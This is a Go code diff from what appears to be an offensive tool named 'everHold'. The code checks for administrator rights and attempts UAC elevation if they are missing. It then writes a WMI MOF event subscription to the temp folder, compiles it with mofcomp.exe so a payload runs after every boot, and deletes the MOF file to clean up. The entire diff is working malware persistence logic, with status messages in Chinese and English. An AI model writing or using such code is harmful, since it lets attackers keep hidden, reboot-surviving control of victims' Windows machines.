@@ -3,16 +3,17 @@ package persist
 import (
 	"everHold/src/conf"
 	"everHold/src/func/elevate"
-	"everHold/src/tools"
+	"everHold/src/utils"
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
+	"strconv"
 	"time"
 )
 
 func Callmethod2(newcmd *conf.RUNCMD) {
-	isAdmin, err := tools.IsUserAnAdmin()
+	isAdmin, err := utils.IsUserAnAdmin()
+	utils.PrintInfo("正在检查权限...")
 	if err != nil {
 		fmt.Println("Error:", err)
 		return
@@ -20,8 +21,9 @@ func Callmethod2(newcmd *conf.RUNCMD) {
 	if isAdmin == true {
 		wmicMof(newcmd.PayloadValue, newcmd.AddValue, newcmd.NameValue)
 	} else {
-		tools.PrintError("权限不足，正在尝试提权...")
-		uacLevel, err := tools.GetCurrentUACLevel()
+		utils.PrintError("当前需要权限为：SYSTEM 。权限不足，正在尝试提权...")
+		uacLevel, err := utils.GetCurrentUACLevel()
+		utils.PrintInfo("当前UAC Level为：" + strconv.FormatUint(uacLevel, 10))
 		if err != nil {
 			fmt.Println("Error:", err)
 			return
@@ -65,54 +67,54 @@ instance of __FilterToConsumerBinding
 		mofPath := filepath.Join(os.TempDir(), name+".mof")
 		mofFile, err := os.Create(mofPath)
 		if err != nil {
-			tools.PrintError("Cannot proceed, unable to create mof file on disk " + mofPath + "\n")
+			utils.PrintError("Cannot proceed, unable to create mof file on disk " + mofPath + "\n")
 			return
 		}
 		defer mofFile.Close()
 
 		_, err = mofFile.WriteString(mofTemplate)
 		if err != nil {
-			tools.PrintError("Cannot proceed, unable to write mof file to disk " + mofPath + "\n")
+			utils.PrintError("Cannot proceed, unable to write mof file to disk " + mofPath + "\n")
 			return
 		}
 
-		tools.PrintSuccess("Successfully wrote mof template to disk " + mofPath + "\n")
+		utils.PrintSuccess("Successfully wrote mof template to disk " + mofPath + "\n")
 		time.Sleep(5 * time.Second)
 
 		// Disable file system redirection
-		tools.PrintInfo("Disabling file system redirection")
-		exitCode := runCmd("cmd", "/C", "disable_fsr.bat")
-		if exitCode != 0 {
-			tools.PrintError("Failed to disable file system redirection")
-			return
-		}
-		tools.PrintSuccess("Successfully disabled file system redirection")
+		//utils.PrintInfo("Disabling file system redirection")
+		//oldValue, err := utils.DisableFSR()
+
+		//if err != nil {
+		//	utils.PrintError("Failed to disable file system redirection \n" + err.Error())
+		//	return
+		//}
+		//utils.PrintSuccess("Successfully disabled file system redirection")
 
 		// Compile MOF file
-		exitCode = runCmd("mofcomp.exe", mofPath)
-		if exitCode == 0 {
-			tools.PrintSuccess("Successfully compiled mof file containing our payload " + payload + "\n")
-			tools.PrintSuccess("Successfully installed persistence, payload will execute after boot")
+		exitCode, success := utils.CreateProcess("mofcomp.exe", mofPath, false, true)
+		if success {
+			utils.PrintSuccess("Successfully compiled mof file containing our payload " + payload + " exitcode: " + strconv.Itoa(exitCode) + "\n")
+			utils.PrintSuccess("Successfully installed persistence, payload will execute after boot")
 		} else {
-			tools.PrintError("Unable to compile mof file containing our payload " + payload + "\n")
+			utils.PrintError("Unable to compile mof file containing our payload " + payload + "\n")
 		}
-
+		//err = utils.RevertFSR(oldValue)
+		//if err != nil {
+		//	fmt.Println("Failed to revert file system redirection:", err)
+		//	return
+		//}
 		// Cleanup
 		time.Sleep(5 * time.Second)
-		tools.PrintInfo("Cleaning up")
+		utils.PrintInfo("Cleaning up")
+		if err := os.Remove(mofPath); err != nil {
+			utils.PrintError("Unable to cleanup" + err.Error())
+			return
+		}
+		utils.PrintSuccess("Successfully cleaned up")
+
 	} else {
 		//删除逻辑
-		tools.PrintInfo("正在删除...")
+		utils.PrintInfo("正在删除...")
 	}
-}
-
-func runCmd(command string, args ...string) int {
-	cmd := exec.Command(command, args...)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	err := cmd.Run()
-	if err != nil {
-		return 1
-	}
-	return 0
 }
